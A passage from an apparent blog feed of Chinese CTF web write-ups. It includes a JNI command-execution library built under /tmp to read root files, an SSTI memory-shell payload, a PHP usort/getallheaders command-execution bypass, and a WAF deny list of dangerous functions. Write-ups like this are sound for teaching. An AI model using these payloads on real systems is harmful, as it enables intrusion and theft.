I2luY2x1ZGUgPGpuaS5oPgojaW5jbHVkZSAiTmF0aXZlTGlicmFyeUV4YW1wbGUuaCIKI2luY2x1ZGUgPHN0cmluZy5oPgojaW5jbHVkZSA8c3RkaW8uaD4KI2luY2x1ZGUgPHN5cy90eXBlcy5oPgojaW5jbHVkZSA8dW5pc3RkLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KCmludCBleGVjbWQoY29uc3QgY2hhciAqY21kLCBjaGFyICpyZXN1bHQpCnsKICAgIHNldHVpZCgwKTsKICAgIGNoYXIgYnVmZmVyWzEwMjQqMTJdOyAgICAgICAgICAgICAgLy/lrprkuYnnvJPlhrLljLoKICAgIEZJTEUgKnBpcGUgPSBwb3BlbihjbWQsICJyIik7IC8v5omT5byA566h6YGT77yM5bm25omn6KGM5ZG95LukCiAgICBpZiAoIXBpcGUpCiAgICAgICAgcmV0dXJuIDA7IC8v6L+U5ZueMOihqOekuui/kOihjOWksei0pQoKICAgIHdoaWxlICghZmVvZihwaXBlKSkKICAgIHsKICAgICAgICBpZiAoZmdldHMoYnVmZmVyLCBzaXplb2YoYnVmZmVyKSwgcGlwZSkpCiAgICAgICAgeyAvL+WwhueuoemBk+i+k+WHuuWIsHJlc3VsdOS4rQogICAgICAgICAgICBzdHJjYXQocmVzdWx0LCBidWZmZXIpOwogICAgICAgIH0KICAgIH0KICAgIHBjbG9zZShwaXBlKTsgLy/lhbPpl63nrqHpgZMKICAgIHJldHVybiAxOyAgICAgIC8v6L+U5ZueMeihqOekuui/kOihjOaIkOWKnwp9CgoKSk5JRVhQT1JUIHZvaWQgSk5JQ0FMTCBKYXZhX05hdGl2ZUxpYnJhcnlFeGFtcGxlX25hdGl2ZU1ldGhvZChKTklFbnYgKmVudiwgam9iamVjdCBvYmosIGpzdHJpbmcganN0cikKCnsKCiAgICBjb25zdCBjaGFyICpjc3RyID0gKCplbnYpLT5HZXRTdHJpbmdVVEZDaGFycyhlbnYsIGpzdHIsIE5VTEwpOwogICAgY2hhciByZXN1bHRbMTAyNCAqIDEyXSA9ICIiOwogICAgaWYgKDEgPT0gZXhlY21kKGNzdHIsIHJlc3VsdCkpCiAgICB7CiAgICAgICAvLyBwcmludGYocmVzdWx0KTsKICAgIH0KCiAgICBjaGFyIHJldHVybl9tZXNzZ2VbMTAwXSA9ICIiOwogICAgc3RyY2F0KHJldHVybl9tZXNzZ2UsIHJlc3VsdCk7CiAgICBqc3RyaW5nIGNtZHJlc3VsdCA9ICgqZW52KS0+TmV3U3RyaW5nVVRGKGVudiwgcmV0dXJuX21lc3NnZSk7CiAgICAvL3N5c3RlbSgpOwoKICAgIHJldHVybiBjbWRyZXN1bHQ7Cn0K|base64 -d &gt;/tmp/JniClass.c&quot;</span></span><br><span class="line">cmd = <span class="string">b&#x27;cd /tmp;gcc -fPIC -I&quot;$JAVA_HOME/include&quot; -I&quot;$JAVA_HOME/include/linux&quot; -shared -o libcmd.so JniClass.c&#x27;</span></span><br><span class="line"></span><br><span class="line">cmd = <span class="string">b&quot;echo cHVibGljIGNsYXNzIE1haW4gewogICAgcHVibGljIG5hdGl2ZSB2b2lkIG5hdGl2ZU1ldGhvZChTdHJpbmcgY21kKTsKICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBtYWluKFN0cmluZ1tdIGFyZ3MpIHsKICAgICAgICBTeXN0ZW0ubG9hZCgiL3RtcC9saWJjbWQuc28iKTsKICAgICAgICBOYXRpdmVMaWJyYXJ5RXhhbXBsZSBleGFtcGxlID0gbmV3IE5hdGl2ZUxpYnJhcnlFeGFtcGxlKCk7CgogICAgICAgIGV4YW1wbGUubmF0aXZlTWV0aG9kKCJjYXQgL3Jvb3QvbWVzc2FnZS50eHQgPiAvdG1wLzIudHh0Iik7IAogICAgfQp9|base64 -d &gt;/tmp/Main.java&quot;</span></span><br><span class="line">cmd = <span class="string">b&quot;cd /tmp;javac Main.java&quot;</span></span><br><span class="line">cmd = <span class="string">b&quot;cd /tmp;java Main 2&amp;&gt;/opt/jetty/webapps/ROOT/WEB-INF/1.txt&quot;</span></span><br><span class="line"></span><br><span class="line">cmd = <span class="string">b&#x27;cat /tmp/2.txt&gt;/opt/jetty/webapps/ROOT/WEB-INF/1.txt&#x27;</span></span><br><span class="line"></span><br><span class="line">send(cmd)</span><br><span class="line"><span class="built_in">print</span>(getResule())</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后的flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">致信后来者：</span><br><span class="line"></span><br><span class="line">同志你好！我是<span class="number">81192</span>，我不是第一批<span class="number">81192</span>，也不会是最后一批<span class="number">81192</span>，<span class="number">81192</span>从来不是一个人。</span><br><span class="line">现在，同志，你也是<span class="number">81192</span>的一员了。</span><br><span class="line"></span><br><span class="line">我已经清理和收集了他们的所有资料并传回总部，但是在我离开的时候，被dylan投毒，我已经感染了他们的朊病毒。</span><br><span class="line">我把我的最后的话，都放到了一个网址里面，你在他们的任务中心中，用dylan身份登陆后，在管理菜单中 访问下面地址，就能看到了！再见了，同志！</span><br><span class="line">网址是：http://<span class="number">8.11</span><span class="number">.9</span><span class="number">.2</span></span><br><span class="line"></span><br><span class="line">现在我命令你：</span><br><span class="line">我已无法返航，请继续前进！请继续前进！</span><br><span class="line"></span><br><span class="line">（完）</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> WEB </tag>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蜀道山</title>
      <link href="/%E8%9C%80%E9%81%93%E5%B1%B1/"/>
      <url>/%E8%9C%80%E9%81%93%E5%B1%B1/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="my-site"><a href="#my-site" class="headerlink" title="my_site"></a>my_site</h2><p>源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, abort, render_template_string, request, render_template, redirect, url_for, session, flash, g</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> rot13, key</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&#x27;your_secret_key&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;DATABASE&#x27;</span>] = <span class="string">&#x27;database.db&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_db</span>():</span><br><span class="line">    db = <span class="built_in">getattr</span>(g, <span class="string">&#x27;_database&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> db <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        db = g._database = sqlite3.connect(app.config[<span class="string">&#x27;DATABASE&#x27;</span>])</span><br><span class="line">    <span class="keyword">return</span> db</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.teardown_appcontext</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">close_connection</span>(<span class="params">exception</span>):</span><br><span class="line">    db = <span class="built_in">getattr</span>(g, <span class="string">&#x27;_database&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> db <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        db.close()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;home.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/rot13&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rot13_route</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        action = request.form[<span class="string">&#x27;action&#x27;</span>]</span><br><span class="line">        text = request.form[<span class="string">&#x27;text&#x27;</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> action == <span class="string">&#x27;encrypt&#x27;</span>:</span><br><span class="line">            encrypted_text = rot13(text)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;rot13_result&#x27;</span>, result=encrypted_text, action=<span class="string">&#x27;encrypt&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">elif</span> action == <span class="string">&#x27;decrypt&#x27;</span>:</span><br><span class="line">            text = request.form[<span class="string">&#x27;text&#x27;</span>]</span><br><span class="line">            decrypted_text = rot13(text)</span><br><span class="line">            <span class="keyword">if</span> key(decrypted_text):</span><br><span class="line">                template = <span class="string">&#x27;&lt;h1&gt;Your decrypted text is: &#123;&#123;%s&#125;&#125;&lt;/h1&gt;&#x27;</span> % decrypted_text</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    render_template_string(template)</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    abort(<span class="number">404</span>)</span><br><span class="line">                <span class="comment"># return &quot;既然你是黑阔，那我凭什么给你回显&quot;</span></span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;rot13_result&#x27;</span>, result=<span class="string">&quot;既然你是黑阔，那我凭什么给你回显&quot;</span>, action=<span class="string">&#x27;decrypt&#x27;</span>))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;rot13_result&#x27;</span>, result=decrypted_text, action=<span class="string">&#x27;decrypt&#x27;</span>))</span><br><span class="line">                template = <span class="string">&#x27;&lt;h1&gt;Your decrypted text is: %s&lt;/h1&gt;&#x27;</span> % decrypted_text</span><br><span class="line">                <span class="keyword">return</span> render_template_string(template)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/rot13_result/&lt;action&gt;/&lt;result&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rot13_result</span>(<span class="params">action, result</span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;rot13_result.html&#x27;</span>, action=action, result=result)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        db = get_db()</span><br><span class="line">        cursor = db.cursor()</span><br><span class="line">        cursor.execute(<span class="string">&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;</span>, (username, password))</span><br><span class="line">        user = cursor.fetchone()</span><br><span class="line">        <span class="keyword">if</span> user:</span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;message_board&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flash(<span class="string">&#x27;Invalid username or password&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        db = get_db()</span><br><span class="line">        cursor = db.cursor()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cursor.execute(<span class="string">&quot;INSERT INTO users (username, password) VALUES (?, ?)&quot;</span>, (username, password))</span><br><span class="line">            db.commit()</span><br><span class="line">            flash(<span class="string">&#x27;Registration successful! Please log in.&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">        <span class="keyword">except</span> sqlite3.IntegrityError:</span><br><span class="line">            flash(<span class="string">&#x27;Username already exists!&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/message_board&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">message_board</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    db = get_db()</span><br><span class="line">    cursor = db.cursor()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        message = request.form[<span class="string">&#x27;message&#x27;</span>]</span><br><span class="line">        cursor.execute(<span class="string">&quot;INSERT INTO messages (username, message) VALUES (?, ?)&quot;</span>, (session[<span class="string">&#x27;username&#x27;</span>], message))</span><br><span class="line">        db.commit()</span><br><span class="line">    </span><br><span class="line">    cursor.execute(<span class="string">&quot;SELECT username, message FROM messages&quot;</span>)</span><br><span class="line">    messages = cursor.fetchall()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;message_board.html&#x27;</span>, messages=messages)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;home&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>在 <code>/rot13</code> 路由发现存在无回显ssti</p><p><img src="/%E8%9C%80%E9%81%93%E5%B1%B1/81d5f4bc-366d-496d-a12d-bc0ab39f0619.png" alt="81d5f4bc-366d-496d-a12d-bc0ab39f0619"></p><p>经过测试，发现存在 <code>()</code> 的时候就会走到ssti的if里面，之后就写内存马来回显</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rot13</span>(<span class="params">text</span>):</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">        <span class="keyword">if</span> char.isalpha():</span><br><span class="line">            ascii_val = <span class="built_in">ord</span>(char)</span><br><span class="line">            <span class="keyword">if</span> char.islower():</span><br><span class="line">                rotated_val = ((ascii_val - <span class="number">97</span>) + <span class="number">13</span>) % <span class="number">26</span> + <span class="number">97</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                rotated_val = ((ascii_val - <span class="number">65</span>) + <span class="number">13</span>) % <span class="number">26</span> + <span class="number">65</span></span><br><span class="line">            result += <span class="built_in">chr</span>(rotated_val)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result += char</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">text = <span class="string">&quot;&quot;&quot;()&#125;&#125;&#123;&#123;url_for[&#x27;__glob&#x27;&#x27;als__&#x27;][&#x27;__buil&#x27;&#x27;tins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None,[]).append(lambda :__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read())&quot;)&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rot13(text))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ()&#125;&#125;&#123;&#123;hey_sbe[&#x27;__tybo&#x27;&#x27;nyf__&#x27;][&#x27;__ohvy&#x27;&#x27;gvaf__&#x27;][&#x27;riny&#x27;](&quot;__vzcbeg__(&#x27;flf&#x27;).zbqhyrf[&#x27;__znva__&#x27;].__qvpg__[&#x27;ncc&#x27;].orsber_erdhrfg_shapf.frgqrsnhyg(Abar,[]).nccraq(ynzoqn :__vzcbeg__(&#x27;bf&#x27;).cbcra(&#x27;png /synt&#x27;).ernq())&quot;)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发送过去即可得到flag</p><p><img src="/%E8%9C%80%E9%81%93%E5%B1%B1/ebb29062-a9f2-464a-a322-1551fd9ade15.png" alt="ebb29062-a9f2-464a-a322-1551fd9ade15"></p><h2 id="海关警察训练平台"><a href="#海关警察训练平台" class="headerlink" title="海关警察训练平台"></a>海关警察训练平台</h2><p>抓包改一下host，然后访问 flag.html</p><p><img src="/%E8%9C%80%E9%81%93%E5%B1%B1/5d6bfd7d-e956-48d3-bb93-33d4e983544e.png" alt="5d6bfd7d-e956-48d3-bb93-33d4e983544e"></p><h2 id="恶意代码检测器"><a href="#恶意代码检测器" class="headerlink" title="恶意代码检测器"></a>恶意代码检测器</h2><p>扫目录可以得到 <a href="http://www.zip/">www.zip</a></p><p><img src="/%E8%9C%80%E9%81%93%E5%B1%B1/e258b2c0-c7ed-4f08-bcad-4478ba210405.png" alt="e258b2c0-c7ed-4f08-bcad-4478ba210405"></p><p>代码审计，可以发现是tp框架</p><p>这里会将我们写入的内容写进一个文件里，然后又包含了进来，但在<code>safe.log</code>那里用的是双引号，waf那里用的是单引号</p><p><img src="/%E8%9C%80%E9%81%93%E5%B1%B1/6b5baba9-bb1e-4ada-86f4-e5af85fc9fd9.png" alt="6b5baba9-bb1e-4ada-86f4-e5af85fc9fd9"></p><p>使用 <code>$&#123;&#125;</code> ，可以在里面的大括号执行代码，</p><p>发现 <code>usort</code> 函数没有被 ban，可以用<code>usort</code>来执行命令</p><p>根据php的特性，不使用引号的话能自己识别类型，可以用字符串拼接的方式绕过过滤</p><p>需要注意的是，因为没有引号，拼接字符的时候会warming，然后tp就报错了，用 <code>@</code> 来忽略掉警告</p><p><code>usort</code>函数的第一个参数要是数组，第二个参数是函数名</p><p>过滤了下划线，不能用GET、POST来传参，可以用 <code>getallheaders</code> 给 <code>system</code> 传参</p><p><code>getallheaders</code>函数的返回值是数组，这个数组的值会分别送进<code>system</code>里面执行，只需要在请求头带上要执行的命令即可</p><p>发送过去，只需要发送一次，后边执行命令的时候code里面随便放什么都行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;@usort((ge.tallheaders)(),sys.tem)&#125;</span><br></pre></td></tr></table></figure><p><img src="/%E8%9C%80%E9%81%93%E5%B1%B1/6c11c198-0265-4412-93f2-f400a9307cf6.png" alt="6c11c198-0265-4412-93f2-f400a9307cf6"></p><h2 id="奶龙牌WAF"><a href="#奶龙牌WAF" class="headerlink" title="奶龙牌WAF"></a>奶龙牌WAF</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>] === UPLOAD_ERR_OK) &#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] : <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$fileExtension</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$name</span>, PATHINFO_EXTENSION));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$fileExtension</span>, <span class="string">&#x27;ph&#x27;</span>) !== <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>(<span class="variable">$fileExtension</span>, <span class="string">&#x27;hta&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;不允许上传此类文件！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;文件大小超过限制！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="literal">false</span>, <span class="literal">null</span>, <span class="number">0</span>, <span class="number">5000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$dangerous_patterns</span> = [</span><br><span class="line">            <span class="string">&#x27;/&lt;\?php/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/&lt;\?=/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/&lt;\?xml/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/\b(eval|base64_decode|exec|shell_exec|system|passthru|proc_open|popen|php:\/\/filter|php_value|auto_append_file|auto_prepend_file|include_path|AddType)\b/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/\b(select|insert|update|delete|drop|union|from|where|having|like|into|table|set|values)\b/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/--\s/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/\/\*\s.*\*\//&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/#/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/&lt;script\b.*?&gt;.*?&lt;\/script&gt;/is&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/javascript:/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/on\w+\s*=\s*[&quot;\&#x27;].*[&quot;\&#x27;]/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/[\&lt;\&gt;\&#x27;\&quot;\\\`\;\=]/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/%[0-9a-fA-F]&#123;2&#125;/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/&amp;#[0-9]&#123;1,5&#125;;/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/&amp;#x[0-9a-fA-F]+;/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/system\(/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/exec\(/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/passthru\(/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/shell_exec\(/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/file_get_contents\(/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/fopen\(/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/file_put_contents\(/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/%u[0-9A-F]&#123;4&#125;/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/[^\x00-\x7F]/&#x27;</span>,</span><br><span class="line">            <span class="comment">// 检测路径穿越</span></span><br><span class="line">            <span class="string">&#x27;/\.\.\//&#x27;</span>,</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$dangerous_patterns</span> <span class="keyword">as</span> <span class="variable">$pattern</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$file_content</span>)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;内容包含危险字符，上传被奶龙拦截！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$upload_dir</span> = <span class="string">&#x27;uploads/&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$upload_dir</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">mkdir</span>(<span class="variable">$upload_dir</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$new_file_name</span> = <span class="variable">$upload_dir</span> . <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">print</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$new_file_name</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;文件保存失败！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件上传失败，错误代码：&quot;</span> . <span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">    &lt;!-- 文件上传表单 --&gt;</span><br><span class="line">    &lt;!DOCTYPE html&gt;</span><br><span class="line">    &lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">        &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">        &lt;title&gt;文件上传&lt;/title&gt;</span><br><span class="line">        &lt;style&gt;</span><br><span class="line">            body &#123;</span><br><span class="line">                font-family: Arial, sans-serif;</span><br><span class="line">                background: <span class="title function_ invoke__">url</span>(<span class="string">&#x27;background.jpeg&#x27;</span>) no-repeat center center fixed;</span><br><span class="line">                background-size: cover;</span><br><span class="line">                display: flex;</span><br><span class="line">                justify-content: center;</span><br><span class="line">                align-items: flex-start;</span><br><span class="line">                height: <span class="number">100</span>vh;</span><br><span class="line">                margin: <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            .upload-container &#123;</span><br><span class="line">                background-color: <span class="title function_ invoke__">rgba</span>(<span class="number">214</span>, <span class="number">227</span>, <span class="number">49</span>, <span class="number">0.22</span>);</span><br><span class="line">                padding: <span class="number">20</span>px;</span><br><span class="line">                border-radius: <span class="number">10</span>px;</span><br><span class="line">                box-shadow: <span class="number">0</span> <span class="number">2</span>px <span class="number">10</span>px <span class="title function_ invoke__">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.1</span>);</span><br><span class="line">                text-align: center;</span><br><span class="line">                position: absolute;</span><br><span class="line">                top: <span class="number">10</span>%; <span class="comment">/* 调整这个值来控制表单距离顶部的高度 */</span></span><br><span class="line">            &#125;</span><br><span class="line">            .upload-container h2 &#123;</span><br><span class="line">                color: <span class="comment">#333;</span></span><br><span class="line">                margin-bottom: <span class="number">20</span>px;</span><br><span class="line">            &#125;</span><br><span class="line">            .file-input &#123;</span><br><span class="line">                display: none;</span><br><span class="line">            &#125;</span><br><span class="line">            .custom-file-upload, .submit-btn &#123;</span><br><span class="line">                display: inline-block;</span><br><span class="line">                padding: <span class="number">10</span>px <span class="number">20</span>px;</span><br><span class="line">                